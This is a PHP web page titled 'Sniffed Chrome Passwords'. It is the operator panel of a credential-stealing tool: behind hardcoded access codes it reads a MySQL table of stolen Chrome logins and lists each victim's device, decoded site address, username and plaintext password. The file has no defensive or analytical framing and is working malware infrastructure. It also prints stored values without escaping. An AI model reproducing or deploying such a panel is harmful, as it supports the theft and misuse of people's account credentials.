<?php
	$isAuth=false;
	if(isset($_POST["accessCode"])) {
		$acs=array("asd43", "#5gre2", "#h76tr", "#ju67s");
		if(in_array($_REQUEST["accessCode"], $acs))
			$isAuth=true;
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<title>Sniffed Chrome Passwords</title>
		<style type="text/css">
			html, body {
				margin: 0;
				padding: 0;
				text-align: center;
				height: 100%;
				width: 100%;
				background-color: #000;
				color: #0f0;
			}
			#input {
				background-color: rgba(10, 10, 10, 10.9);
				color: #0f0;
			    position: absolute;
			    top: 0;
			    bottom: 0;
			    left: 0;
			    right: 0;
			    margin: auto;
			    height: fit-content;
			    width: fit-content;
			    padding: 5px;
			    border: 2px solid;
			    display: none;
			}
			input {
				width: 100%;
			    background-color: rgba(10, 10, 10, 10.9);
			    outline: none;
			    border: 0;
			    color: #0f0;
			    font-size: xx-large;
			}
			table {
				width: 100%;
				border: 2px solid;
			}
			table th, td {
				border: 2px solid;
			}
			.url-address a {
				text-decoration: underline;
				color: #0a0;
			}
		</style>
		<script type="text/javascript" defer>
			<?php
				if($isAuth==false) {
					print<<<HERE
			function initialise() {
				document.getElementById("input").style.display="block";
				document.getElementById("dispData").style.display="none";
				let diaInp=document.getElementById("keyInp");
				diaInp.focus();
			}
HERE;
				}
			?>
			function keyPressed(event) {

			}
		</script>
	</head>
	<body>
		<div id="input">
			<h1 style="text-align: center;">Enter Access Key</h1>
			<form method="post" action="">
				<input type="password" name="accessCode" id="keyInp">
			</form>
		</div>
		<h1 style="border: 2px dashed;">Sniffed Chrome Passwords</h1>
		<table id="dispData">
			<tbody>
				<tr>
					<th>Unique ID</th>
					<th>Date</th>
					<th>Device Name</th>
					<th>Web Address</th>
					<th>User Name</th>
					<th>Password</th>
				</tr>
				<?php
					if($isAuth==true) {
						include("conf.php");
						$conn=new mysqli($server, $username, $password, $db);
						if(!$conn->connect_errno){
							if($query=$conn->prepare("SELECT * FROM `chromepassword` ORDER BY Time DESC;")) {
								$query->execute();
								$query->bind_result($id, $device, $time, $url, $user, $pass);
								while($query->fetch()) {
									print<<<HERE
				<tr>
					<td>$id</td>
					<td>$time</td>
					<td>$device</td>
					<td class="url-address">$url</td>
					<td>$user</td>
					<td>$pass</td>
				</tr>
HERE;
								}
							}
						}
					}
				?>
			</tbody>
		</table>
	</body>
	<script type="text/javascript">
		try {
			initialise();
		}
		catch(ReferenceError) {
			let data="";
			let dataCells=document.getElementsByClassName('url-address');
			for(let dataCell of dataCells) {
				data=atob(dataCell.innerHTML);
				dataCell.innerHTML='<a target="_blank" href="'+data+'">'+data+"</a>";
			}
		}
	</script>
</html>